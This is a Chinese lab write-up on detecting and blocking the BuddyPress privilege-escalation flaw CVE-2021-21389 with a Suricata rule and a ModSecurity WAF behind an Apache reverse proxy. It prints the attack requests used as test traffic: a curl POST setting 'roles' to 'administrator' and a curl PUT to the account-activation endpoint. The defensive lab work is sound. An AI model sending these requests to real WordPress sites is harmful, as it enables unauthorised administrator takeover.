   Suricata 是一个高性能的开源网络 IDS（入侵检测系统）、IPS（入侵防御系统）和网络安全监控引擎。它能够实时分析网络流量，检测恶意行为，并通过规则匹配识别攻击模式。

   **1. 安装启动 Suricata**
   ```bash
   docker run -d --name suricata --net=host -e SURICATA_OPTIONS="-i eth1" jasonish/suricata:6.0.4
   ```
   - `suricata` 包含了核心引擎和默认规则集。
   - 安装完成后，默认配置文件位于 `/etc/suricata/suricata.yaml`。
   **2. 编辑 Suricata 配置文件**
      - 首先进入容器内部
      ```bash
      docker exec -it suricata bash
      ```
      - 创建一个自定义规则文件 , 写入：
      ```bash 
      echo '
      alert http $EXTERNAL_NET any -> $HOME_NET any (
         msg:"CVE-2021-21389: BuddyPress 提权尝试";
         flow:to_server,established;
         content:"POST"; http_method;
         content:"/wp-json/buddypress/v1/members/me"; http_uri;
         content:"roles"; http_client_body; fast_pattern;
         content:"administrator"; http_client_body;
         sid:1000001;
         rev:1;
         classtype:web-application-attack;
         )' > /etc/suricata/rules/cve-2021-21389.rules
      ```
      - 加载自定义规则
      ```bash
      sudo vim /etc/suricata/suricata.yaml
      ```
      在 ``rule-files:`` 下添加一行：
      ```bash
       - cve-2021-21389.rules
      ```
      ##### **规则解释：**

      | 字段 | 说明 |
      |------|------|
      | `alert http` | 表示这是一个 HTTP 协议的告警规则 |
      | `$EXTERNAL_NET any -> $HOME_NET any` | 表示从外部网络发起请求到内部网络主机的任意端口 |
      | `msg` | 告警信息描述 |
      | `flow:to_server,established` | 仅匹配已建立连接的服务器方向流量 |
      | `content:"POST"` + `http_method` | 匹配 POST 请求方法 |
      | `content:"/wp-json/buddypress/v1/members/me"` + `http_uri` | 匹配请求 URI 是否包含特定路径 |
      | `content:"roles"` + `http_client_body` + `fast_pattern` | 快速匹配请求体中的 "roles" 字段 |
      | `content:"administrator"` + `http_client_body` | 匹配请求体中是否包含 `"administrator"` |
      | `sid:1000001` | 规则唯一 ID |
      | `rev:1` | 规则版本号 |
      | `classtype:web-application-attack` | 分类为 Web 应用攻击 |

      **3. 重启docker**
      ```bash
      sudo systemctl restart suricata
      ```
      **4. 触发攻击并验证检测效果**
      打开另一个终端，发送提权请求：
      ```bash
      curl -X POST http://<your_wordpress_ip>/wp-json/buddypress/v1/members/me \
         -H "X-WP-Nonce: <valid_nonce>" \
         -H "Content-Type: application/json" \
         -d '{"roles": "administrator"}'
      ```
      替换 `<your_wordpress_ip>` 和 `<valid_nonce>` 为你实际的测试目标地址和有效的 Nonce 值。
      **5. 查看 Suricata 告警日志**
      - 切换回运行 Suricata 的终端，或查看日志文件：
         ```bash
         tail -f /var/log/suricata/fast.log
         ```
      - 可以看到终端中出现日志：
         ```
         [**] [1:1000001:1] CVE-2021-21389: BuddyPress 提权尝试 [**]
         [Priority: 1]
         05/22-14:23:17.123456 [ET.http] POST /wp-json/buddypress/v1/members/me HTTP/1.1
         ```
      - 这表明 Suricata 成功检测到了 CVE-2021-21389 提权攻击尝试。

---

## PART3 漏洞缓解

**打造Web应用防火墙（WAF）来缓解 Wordpress 漏洞**

### 实验目标
搭建并配置 ModSecurity Web 应用防火墙（WAF），以防御 Wordpress 漏洞攻击。通过实验，掌握以下内容：
1. ModSecurity 的安装与配置。
2. OWASP 核心规则集（CRS）的使用。
3. 针对 Wordpress 漏洞的自定义规则配置。
4. 通过反向代理测试 WAF 的拦截效果。
5. 解决实验过程中遇到的常见问题。

---

### 实验环境
- 操作系统：Kali Linux
- 工具：Apache2、ModSecurity、OWASP CRS、Docker、Wireshark
- 漏洞环境：Wordpress 漏洞测试环境（运行在 23509 端口）

---

### 实验流程

#### 1. 安装ModSecurity
ModSecurity 是一个开源的 Web 应用防火墙（WAF）模块，支持 Apache、Nginx 等 Web 服务器。它通过检测和拦截恶意请求来保护 Web 应用程序。

##### 安装Apache和ModSecurity
```bash
sudo apt update
sudo apt install apache2 libapache2-mod-security2
```
- apache2 是 Apache HTTP 服务器。
- libapache2-mod-security2 是 ModSecurity 的 Apache 模块。
![1748183239288](image/readme/1748183239288.png)

##### 配置ModSecurity
1. 备份默认配置文件：
   ```bash
   sudo cp /etc/modsecurity/modsecurity.conf-recommended /etc/modsecurity/modsecurity.conf
   ```
   ![1748183212133](image/readme/1748183212133.png)
   - 默认情况下，ModSecurity 提供了一个推荐的配置文件 modsecurity.conf-recommended。
   - 复制该文件为 modsecurity.conf，以便进行自定义配置。
2. 编辑配置文件：
   ```bash
   sudo vim /etc/modsecurity/modsecurity.conf
   ```
   将`SecRuleEngine`设置为`On`：
   ```bash
   SecRuleEngine On
   ```
   SecRuleEngine 控制 ModSecurity 的规则引擎状态,有以下三种状态:
   - Off：完全禁用规则引擎。
   - DetectionOnly：启用规则引擎，但仅用于检测，不会拦截恶意请求。
   - On：启用规则引擎，检测并拦截恶意请求。
   ![1748183252358](image/readme/1748183252358.png)

3. 重启Apache：
   ```bash
   sudo systemctl restart apache2
   ```
   Apache 在启动时会加载 ModSecurity 模块及其配置文件。
   ![1748183263888](image/readme/1748183263888.png)

#### 3. 使用OWASP核心规则集（CRS）
OWASP CRS提供了一套规则，用于防御常见Web攻击。

##### 下载OWASP CRS
```bash
sudo apt install modsecurity-crs
```
OWASP CRS 是一组预定义的规则，覆盖了多种 Web 攻击类型。
![1748183274617](image/readme/1748183274617.png)

##### 配置OWASP CRS
1. 将规则集链接到ModSecurity：
   ```bash
   sudo ln -s /usr/share/modsecurity-crs/ /etc/apache2/modsecurity-crs
   ```
    ![1748183286516](image/readme/1748183286516.png)
   - 创建符号链接是为了让 ModSecurity 能够方便地访问和加载 OWASP CRS 提供的规则文件。
2. 在ModSecurity配置中加载规则集：
   ```bash
   sudo vim /etc/apache2/mods-enabled/security2.conf
   ```
   添加以下内容：
   ```bash
   IncludeOptional /etc/apache2/modsecurity-crs/*.conf
   IncludeOptional /etc/apache2/modsecurity-crs/rules/*.conf
   ```
   这样配置后,IncludeOptional 指令告诉 Apache 加载指定路径下的所有 .conf 文件。加载 /etc/apache2/modsecurity-crs/ 目录下的所有主配置文件。加载该目录下 rules/ 子目录中的所有规则文件
   ![1748183294205](image/readme/1748183294205.png)

3. 重启Apache：
   ```bash
   sudo systemctl restart apache2
   ```
   ModSecurity 会在每次请求时应用这些规则，检测并拦截恶意流量。

#### 4. 自定义 Wordpress 漏洞规则配置
为了防御 Wordpress 漏洞攻击，我们需要添加针对其原理的自定义规则。

##### 添加自定义规则
1. 创建自定义规则文件：
   ```bash
   sudo vim /etc/apache2/modsecurity-crs/rules/REQUEST-900-Wordpress.conf
   ```

2. 添加以下规则：
   ```
   # 拦截尝试修改角色的请求
   SecRule REQUEST_URI "@contains /wp-json/buddypress/v1/members/me" \
      "id:1001,\
      phase:2,\
      block,\
      msg:'BuddyPress 权限提升尝试',\
      chain"
      SecRule REQUEST_METHOD "@streq POST" \
         "chain"
         SecRule REQUEST_BODY "@rx \"roles\"\s*:\s*\"administrator\"" \
               "t:none,t:urlDecode,t:htmlEntityDecode"

   # 拦截异常的激活请求
   SecRule REQUEST_URI "@rx /wp-json/buddypress/v1/signup/activate/[^/]+$" \
      "id:1002,\
      phase:2,\
      block,\
      msg:'可疑的BuddyPress账户激活尝试'"
   ```
   🔹**第一条规则：拦截尝试修改角色的请求（权限提升）**
      | 参数名称 | 值/表达式 | 说明 |
      |----------|------------|------|
      | `SecRule` | - | 定义一条 ModSecurity 规则 |
      | `REQUEST_URI` | `@contains /wp-json/buddypress/v1/members/me` | 匹配请求 URI 中是否包含特定路径（即目标接口） |
      | `id` | `1001` | 规则唯一标识符，便于日志追踪和管理 |
      | `phase` | `2` | 在请求处理阶段 2（请求头和请求体已解析）执行此规则 |
      | `block` | - | 如果匹配成功，则阻止请求并返回 403 Forbidden |
      | `msg` | `'BuddyPress 权限提升尝试'` | 当规则触发时记录的日志信息 |
      | `chain` | - | 表示该规则与下一条规则形成“链式”匹配关系，必须同时满足所有条件才会触发动作 |

      - 作用：
         1. 检测请求是否访问了 `/wp-json/buddypress/v1/members/me` 接口；
         2. 判断请求方法是否为 `POST`；
         3. 检查请求体中是否包含 `"roles": "administrator"`；
         4. 如果全部条件都满足，ModSecurity 将阻断请求，并记录日志。


   🔹**第二条规则：拦截异常的激活请求（注册绕过）**

   ```apache
   SecRule REQUEST_URI "@rx /wp-json/buddypress/v1/signup/activate/[^/]+$" \
      "id:1002,\
      phase:2,\
      block,\
      msg:'可疑的BuddyPress账户激活尝试'"
   ```

   | 参数名称 | 值/表达式 | 说明 |
   |----------|------------|------|
   | `SecRule` | - | 定义一条 ModSecurity 规则 |
   | `REQUEST_URI` | `@rx /wp-json/buddypress/v1/signup/activate/[^/]+$` | 使用正则表达式匹配请求 URI 是否符合 `/wp-json/buddypress/v1/signup/activate/<activation_key>` 的格式 |
   | `id` | `1002` | 规则唯一标识符 |
   | `phase` | `2` | 在请求处理阶段 2 执行此规则 |
   | `block` | - | 如果匹配成功，则阻止请求并返回 403 Forbidden |
   | `msg` | `'可疑的BuddyPress账户激活尝试'` | 当规则触发时记录的日志信息 |

   - 作用：
      1. 检测请求是否访问了 BuddyPress 的激活接口；
      2. 判断 URL 中是否包含一个随机生成的激活密钥（如 `v6EeK8XWihRsxXvXAWPMVzSTO2gs7WdF`）；
      3. 如果匹配成功，ModSecurity 将阻断请求并记录日志。

| 攻击行为 | 对应规则 | 功能 |
|----------|-----------|------|
| 提权（将普通用户变为管理员） | 第一条规则 | 拦截 `/wp-json/buddypress/v1/members/me` 的 POST 请求中包含 `"roles": "administrator"` 的情况 |
| 注册绕过（直接激活账户） | 第二条规则 | 拦截 `/wp-json/buddypress/v1/signup/activate/<activation_key>` 的请求 |

如果条件满足，**ModSecurity 将阻断请求，并记录日志。** 这种方式可以有效防御 CVE-2021-21389 漏洞利用行为。

3. 重启Apache：
   ```bash
   sudo systemctl restart apache2
   ```

---

#### 5. 监控和日志分析
启用ModSecurity的日志功能，记录所有拦截的请求，便于后续分析。

##### 配置日志

1. 编辑ModSecurity配置文件：
   ```bash
   sudo vim /etc/modsecurity/modsecurity.conf
   ```

2. 确保日志路径正确：
   ```bash
   SecAuditLog /var/log/apache2/modsec_audit.log
   ```
   - SecAuditLog 指令用于指定 ModSecurity 审计日志的存储路径。
   - /var/log/apache2/modsec_audit.log 是默认的日志文件路径，记录所有拦截的请求及其详细信息。
3. 重启Apache：
   ```bash
   sudo systemctl restart apache2
   ```


#### 6. **配置 Apache2 监听 `81` 端口**
编辑 Apache 的配置文件：
```bash
sudo vim /etc/apache2/ports.conf
```
将 `Listen 80` 改为 `Listen 81`。
![1748236550489](image/readme/1748236550489.png)
编辑虚拟主机配置文件：
```bash
sudo vim /etc/apache2/sites-available/000-default.conf
```
将 `<VirtualHost *:80>` 改为 `<VirtualHost *:81>`。
![1748236586413](image/readme/1748236586413.png)
重启 Apache：
```bash
sudo systemctl restart apache2
```

---

#### 7. **配置反向代理**
启用 Apache 的反向代理模块：
```bash
sudo a2enmod proxy
sudo a2enmod proxy_http
```
- a2enmod 命令用于启用 Apache 模块。
proxy 和 proxy_http 模块用于实现反向代理功能。
- 编辑虚拟主机配置文件：
```bash
sudo vim /etc/apache2/sites-available/000-default.conf
```
在 `<VirtualHost *:81>` 块中添加以下内容：
```bash
<VirtualHost *:81>
    ProxyPreserveHost On
    ProxyPass / http://127.0.0.1:23509/
    ProxyPassReverse / http://127.0.0.1:23509/
</VirtualHost>
```
![1748183339649](image/readme/1748183339649.png)

重启 Apache：
```bash
sudo systemctl restart apache2
```
- Apache 将开始监听 81 端口，并将所有请求通过反向代理转发到 23509 端口。


- **目前的拓扑图:**
```bash
+-------------------+       +-------------------+       +-------------------+
|      Client       | ----> |     WAF (Apache   | ----> |   Target Server   |
|    (curl 请求)    |       |   + ModSecurity)  |       | (Wordpress 测试环境) |
+-------------------+       +-------------------+       +-------------------+
        |                           |                           |
        | 1. 发送请求到 81        | 2. iptables 重定向到 23509    | 3. 处理请求
        | ------------------------> | ------------------------> |
        |                           |                           |
        |                           | 4. 拦截恶意请求             |
        |                           | (返回 403 Forbidden)       |
        | <------------------------ |                           |
        |                           |                           |
        |                           | 5. 记录日志                |
        |                           | (modsec_audit.log)         |
```

---

#### 8. **测试 WAF 是否拦截恶意请求**
```bash
 curl -X PUT -d '{"user_login": "attacker5", "user_email": "attacker5@163.com", "user_name": "attacker5", "password": "attacker5"}' http://192.168.20.12:81/wp-json/buddypress/v1/signup/activate/2pnXFe3HAC3A5SPWCf5OPbWd3LVO3C
```
- 通过 curl 命令向 81 端口发送一个提权的请求。
- 如果 WAF 配置正确，应该返回 403 Forbidden，表示请求被拦截。
- 如果请求被拦截，ModSecurity 会在日志文件中记录详细的请求信息。
![1747959087953](image/readme/1747959087953.png)
![1747963376713](image/readme/1747963376713.png)

---

### **总结一下**
- 直接 `curl` `23509` 端口可以测试 wordpress提权 漏洞，但无法测试 WAF 的效果。
- 通过反向代理的方式，可以让请求经过 Apache 和 ModSecurity，从而测试 WAF 是否能够拦截恶意请求。
- 使用 `curl` 向 `81` 端口发送请求，验证 WAF 是否生效。
- 通过以上步骤，我在Kali Linux上搭建一个基础的WAF，缓解wordpress提权漏洞。定期更新规则集和监控日志是确保WAF持续有效的关键。

---

#### **为什么需要经过 Apache？**
1. **WAF 的作用**：WAF（Web 应用防火墙）的目的是检测并拦截恶意请求。如果请求直接到达 wordpress 测试环境，WAF 就无法发挥作用。
2. **测试 WAF 的效果**：你需要验证 WAF 是否能够正确拦截包含提权指令的恶意请求。如果请求不经过 WAF，就无法测试 WAF 的效果。
WAF（ModSecurity）全部设在了 81 端口：Apache 监听 81 端口，并通过 ModSecurity 检测所有到达该端口的请求。

wordpress 测试环境仍然运行在 23509 端口：Apache 会将通过 WAF 检测的合法请求转发到 23509 端口。

#### 为什么 WAF 不直接设在 23509 端口？
端口冲突：一个端口只能被一个进程占用。如果 Apache 监听 23509 端口，wordpress 测试环境就无法再监听该端口。

反向代理的优势：通过反向代理，你可以将 WAF 和 wordpress 测试环境解耦，让它们分别运行在不同的端口上，同时确保所有流量都经过 WAF 检测。

---

### 实验总结
本次实验中，我们成功搭建并配置了 ModSecurity WAF，能够有效拦截wordpress提权漏洞攻击。实验过程中，我们学习了以下内容：
1. ModSecurity 的安装与配置。
2. OWASP CRS 的使用。
3. 针对wordpress提权漏洞的自定义规则配置。
4. 通过反向代理测试 WAF 的拦截效果。
5. 解决实验过程中遇到的常见问题。

实验结果表明，WAF 能够有效防御wordpress提权漏洞攻击，但需要定期更新规则集和监控日志，以确保其持续有效。

---

## **问题分析**

### **当前现象**
1. **`curl` 访问 `81` 端口（Apache）**：
   - 返回 403 Forbidden ，说明 WAF 拦截了请求。
   - 这表明 Apache 配置了 ModSecurity 规则，检测到了某些可疑内容。

2. **`curl` 访问 `23509` 端口（wordpress 测试环境）**：
   - 可以访问成功，流量绕过了 WAF。

---

## **解决方案**

### **1. 检查 iptables 规则**

#### **查看当前 iptables 规则**
运行以下命令，查看当前的 iptables 规则：
```bash
sudo iptables -t nat -L -n -v
```

#### **确保规则正确**
检查是否有以下规则：
```bash
Chain PREROUTING (policy ACCEPT 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination         
    0     0 REDIRECT   tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:23509 redir ports 81
```

如果没有这条规则，说明 iptables 规则未生效。重新添加规则：
```bash
sudo iptables -t nat -A PREROUTING -p tcp --dport 23509 -j REDIRECT --to-port 81
```

#### **保存 iptables 规则**
确保规则在重启后仍然生效：
```bash
sudo iptables-save | sudo tee /etc/iptables/rules.v4
```

---

### **2. 检查 Apache 反向代理配置**

#### **确认 Apache 配置文件**
1. 打开 Apache 的虚拟主机配置文件：
   ```bash
   sudo vim /etc/apache2/sites-available/000-default.conf
   ```

2. 确保配置如下：
   ```bash
   <VirtualHost *:81>
       ProxyPreserveHost On
       ProxyPass / http://127.0.0.1:23509/
       ProxyPassReverse / http://127.0.0.1:23509/
   </VirtualHost>
   ```

3. 保存并退出编辑器。

#### **确认端口配置文件**
1. 打开 Apache 的端口配置文件：
   ```bash
   sudo vim /etc/apache2/ports.conf
   ```

2. 确保 Apache 监听 `81` 端口：
   ```bash
   Listen 81
   ```

3. 保存并退出编辑器。

#### **重启 Apache**
```bash
sudo systemctl restart apache2
```

---

### **3. 检查 Target Server 监听地址**

#### **确认 Target Server 绑定到 `localhost`**
1. 修改 Target Server 也就是wordpress服务的docker，使其仅监听 `127.0.0.1:23509`。
   - 例如，如果 Target Server 是一个 Java 应用，可以在启动命令中指定绑定地址：
     ```bash
     ┌──(kali㉿kali)-[~/workspace/ctf-games/fofapro/vulfocus]
      └─$ docker run -d \
      --name wordpress-vul \
      -p 127.0.0.1:57039:80 \
      -p 127.0.0.1:25926:3306 \
      vulfocus/wordpress_cve-2021-21389:latest

      e63753ca437f362b7233e9290d8fbbbde9bffe16e72b9be91bb577ea7d64d76c
     ```
     ![1747963177042](image/readme/1747963177042.png)
   在 Docker 容器中，``127.0.0.1`` 指的是容器内部的回环接口，而不是宿主机的回环接口。因此，即使容器的 80 端口映射到了宿主机的 57039 端口，外部请求也无法通过宿主机的 IP 地址和端口访问到容器中的应用程序，因为应用程序只监听容器内部的 ``127.0.0.1``
   - 重启docker 容器
   ![1747963395690](image/readme/1747963395690.png)
   ![1747963425567](image/readme/1747963425567.png)

2. 确保 Target Server 不再监听外部地址（如 `0.0.0.0:23509`）。

---

### **4. 测试配置**

#### **测试 iptables 重定向**
1. 运行以下命令，测试 iptables 重定向是否生效：
   ```bash
   curl http://<Target-IP>:23509/
   ```
   - 如果配置正确，流量会被重定向到 `81` 端口，并经过 WAF。

2. 检查 Apache 日志，确认请求是否被正确处理：
   ```bash
   tail -f /var/log/apache2/access.log
   ```

#### **测试 WAF 拦截**
1. 发送包含恶意 payload 的请求：
   ```bash
   curl -X PUT -d '{"user_login": "attacker5", "user_email": "attacker5@163.com", "user_name": "attacker5", "password": "attacker5"}' http://192.168.20.12:57039/wp-json/buddypress/v1/signup/activate/2pnXFe3HAC3A5SPWCf5OPbWd3LVO3C
   ```
2. 检查是否返回 `403 Forbidden`，并查看 ModSecurity 日志：
   ```bash
   tail -f /var/log/apache2/modsec_audit.log
   ```

   这时我们再curl 一下,会发现了返回我们想要的指定指令,证明了我们攻击防御成功!
   - `curl wordpress` 服务所在的 23509 端口返回的内容 `could not connect to server`
   - `curl WAF` 服务所在的81端口返回的内容 `403 Forbidden`
   ![1747963078269](image/readme/1747963078269.png)


- **目前的网络拓扑图:**
```bash
+-------------------+       +-------------------+       +-------------------+
|      Client       | ----> |     WAF (Apache   | ----> |   Target Server   |
|    (curl 请求)    |       |   + ModSecurity)  |       | (Wordpress 测试环境) |
+-------------------+       +-------------------+       +-------------------+
        |                           |                           |
        | 1. 发送请求到 81           | 2. 重定向到 23509          | 3. 处理请求
        | ------------------------> | ------------------------> |
        |                           |                           |
        |                           | 4. 拦截恶意请求            |
        |                           | (返回 403 Forbidden)      |
        | <------------------------ |                           |
        |                           |                           |
        |                           | 5. 记录日志                |
        |                           | (modsec_audit.log)        |
```

```bash
+-------------------+       +-------------------+       +-------------------+
|      Client       | ----> |     WAF (Apache   | ----> |   Target Server   |
|    (curl 请求)    |       |   + ModSecurity)  |       | (Wordpress 测试环境) |
+-------------------+       +-------------------+       +-------------------+
        |                                                     |
        |                      1. 发送请求到 23509           
        | ---------------------------------------------------> |
        |                            2. iptables 重定向到 81
                                    <------------------------ 
                                     3. 处理请求
        |                           |
        |                           | 4. 拦截恶意请求              |
        |                           | (返回 403 Forbidden)        |
        | <------------------------ |                             |
        |                           |                             |
        |                           | 5. 记录日志                  |
        |                           | (modsec_audit.log)          |
```